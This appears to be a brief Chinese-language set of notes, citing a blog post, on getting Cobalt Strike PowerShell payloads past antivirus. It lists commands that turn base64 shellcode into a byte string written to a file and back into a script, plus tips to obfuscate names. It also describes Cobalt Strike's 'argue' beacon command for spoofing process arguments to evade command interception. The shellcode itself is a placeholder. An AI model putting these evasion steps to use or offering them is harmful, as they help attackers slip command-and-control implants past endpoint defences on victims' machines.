	From: https://y4er.com/post/cobalt-strike-powershell-bypass/
	powershell>$string = ''
	powershell>$s = [Byte[]]$var_code = [System.Convert]::FromBase64String('[cs生成的shellcode]')
	powershell>$s |foreach { $string = $string + $_.ToString()+','}
	powershell>$string>c:\1.txt
	修改ps脚本
	[Byte[]]$var_code = [Byte[]](payload)
	再混淆一下函数和变量
	绕过执行命令的拦截
	使用cs的参数欺骗
	beacon > argue cmd.exe blablabla